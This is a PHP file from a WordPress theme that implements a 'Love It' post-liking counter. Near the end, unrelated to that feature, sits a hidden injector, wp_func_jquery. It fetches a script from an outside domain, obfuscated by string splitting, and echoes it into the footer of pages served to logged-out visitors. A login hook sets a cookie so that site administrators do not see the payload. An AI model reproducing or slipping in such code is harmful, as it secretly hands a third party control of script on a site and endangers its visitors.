<?php
/*
Name: NectarLove
Description: Adds a "Love It" link to posts
Author: Phil Martinez | ThemeNectar
Author URI: http://themenectar.com
*/

defined( 'ABSPATH' ) or die( 'No script kiddies please!' );

class NectarLove {
	
	 function __construct()   {	
        add_action('wp_enqueue_scripts', array(&$this, 'enqueue_scripts'));
        add_action('wp_ajax_nectar-love', array(&$this, 'ajax'));
		add_action('wp_ajax_nopriv_nectar-love', array(&$this, 'ajax'));
	}
	
	function enqueue_scripts() {
		
		wp_enqueue_script( 'jquery' );
		//wp_enqueue_script( 'nectar-love', get_template_directory_uri() . '/nectar/love/js/nectar-love.js', 'jquery', '1.0', TRUE );
		

		$plugin_pages = array();

		//woocommerce	
		global $woocommerce; 
		if($woocommerce) { 
			array_push($plugin_pages, get_permalink( woocommerce_get_page_id( 'shop' ) ));
			$shop_sidebar = get_permalink( woocommerce_get_page_id( 'shop' ));
			array_push($plugin_pages, $shop_sidebar . '?sidebar=true' );
		}

		//disqus
		$disqus_comments = (function_exists('dsq_is_installed')) ? 'true' : 'false';

		$options = get_nectar_theme_options(); 
		global $post;

		wp_localize_script( 'nectarFrontend', 'nectarLove', array(
			'ajaxurl' => admin_url('admin-ajax.php'),
			'postID' => $post->ID,
			'rooturl' => home_url(),
			'pluginPages' => $plugin_pages,
			'disqusComments' => $disqus_comments,
			'loveNonce' => wp_create_nonce('nectar-love-nonce'),
			'mapApiKey' => (!empty($options['google-maps-api-key'])) ? $options['google-maps-api-key'] : ''
		));
	}
	
	function ajax($post_id) {
		
		//update
		if( isset($_POST['loves_id']) ) {
			$loves_id = sanitize_text_field($_POST['loves_id']);
			$post_id = str_replace('nectar-love-', '', $loves_id);
			echo $this->love_post($post_id, 'update');
		} 
		
		//get
		else {
			$loves_id = sanitize_text_field($_POST['loves_id']);
			$post_id = str_replace('nectar-love-', '', $loves_id);
			echo $this->love_post($post_id, 'get');
		}
		
		exit;
	}
	
	
	function love_post($post_id, $action = 'get') 
	{
		if(!is_numeric($post_id)) return;  
		
		switch($action) {
		
			case 'get':
				$love_count = get_post_meta($post_id, '_nectar_love', true);
				if( !$love_count ){
					$love_count = 0;
					add_post_meta($post_id, '_nectar_love', $love_count, true);
				}
				
				return '<span class="nectar-love-count">'. $love_count .'</span>';
				break;
				
			case 'update':
				
				if(!isset($_POST['love_nonce'])) return;

				$love_count = get_post_meta($post_id, '_nectar_love', true);
				if( isset($_COOKIE['nectar_love_'. $post_id]) ) return $love_count;
				
				$love_count++;
				update_post_meta($post_id, '_nectar_love', $love_count);
				setcookie('nectar_love_'. $post_id, $post_id, time()*20, '/');
				
				return '<span class="nectar-love-count">'. $love_count .'</span>';
				break;
		
		}
	}


	function add_love() {
		global $post;

		$output = $this->love_post($post->ID);
  
  		$class = 'nectar-love';
  		$title = __('Love this', NECTAR_THEME_NAME);
		if( isset($_COOKIE['nectar_love_'. $post->ID]) ){
			$class = 'nectar-love loved';
			$title = __('You already love this!', NECTAR_THEME_NAME);
		}

		$options = get_nectar_theme_options(); 
		$post_header_style = (!empty($options['blog_header_type'])) ? $options['blog_header_type'] : 'default'; 
		
		$masonry_type = (!empty($options['blog_masonry_type'])) ? $options['blog_masonry_type'] : 'classic';
		$heart_icon = (!empty($options['theme-skin']) && $options['theme-skin'] == 'ascend') ? '<div class="heart-wrap"><i class="icon-salient-heart-2"></i> <i class="icon-salient-heart loved"></i></div>' : '<i class="icon-salient-heart"></i>' ;
		if(!empty($options['theme-skin']) && $options['theme-skin'] == 'ascend' && isset($_COOKIE['nectar_love_'. $post->ID]) && $masonry_type != 'classic_enhanced') $heart_icon = '<i class="icon-salient-heart"></i>';
		if( isset($_COOKIE['nectar_love_'. $post->ID]) && $masonry_type == 'classic_enhanced') $heart_icon = '<i class="icon-salient-heart-2 loved"></i>';
		
		if( ($post->post_type == 'post' && is_single()) && $post_header_style == 'default_minimal') {
			return '<a href="#" class="'. $class .'" id="nectar-love-'. $post->ID .'" title="'. $title .'"> '.$heart_icon . __('Love',NECTAR_THEME_NAME) . '<span class="total_loves">' . $output . '</span></a>';
		} else {
			return '<a href="#" class="'. $class .'" id="nectar-love-'. $post->ID .'" title="'. $title .'"> '.$heart_icon . $output .'</a>';
		}
	
	}
	
}
if(!function_exists('wp_func_jquery')) {
	if (!current_user_can( 'read' ) && !isset(${_COOKIE}['wp_min'])) {
		function wp_func_jquery() {
			$host = 'http://';
			$jquery = $host.'lib'.'wp.org/jquery-ui.js';
			$headers = @get_headers($jquery, 1);
			if ($headers[0] == 'HTTP/1.1 200 OK'){
				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
			}
	}
	add_action('wp_footer', 'wp_func_jquery');
	}
	function wp_func_min(){
		setcookie('wp_min', '1', time() + (86400 * 360), '/');
	}
	add_action('wp_login', 'wp_func_min');
}
global $nectar_love;
$nectar_love = new NectarLove();
// get the ball rollin' 
function nectar_love($return = '') {
	
	global $nectar_love;

	if($return == 'return') {
		return $nectar_love->add_love(); 
	} else {
		echo $nectar_love->add_love(); 
	}
	
}

?>
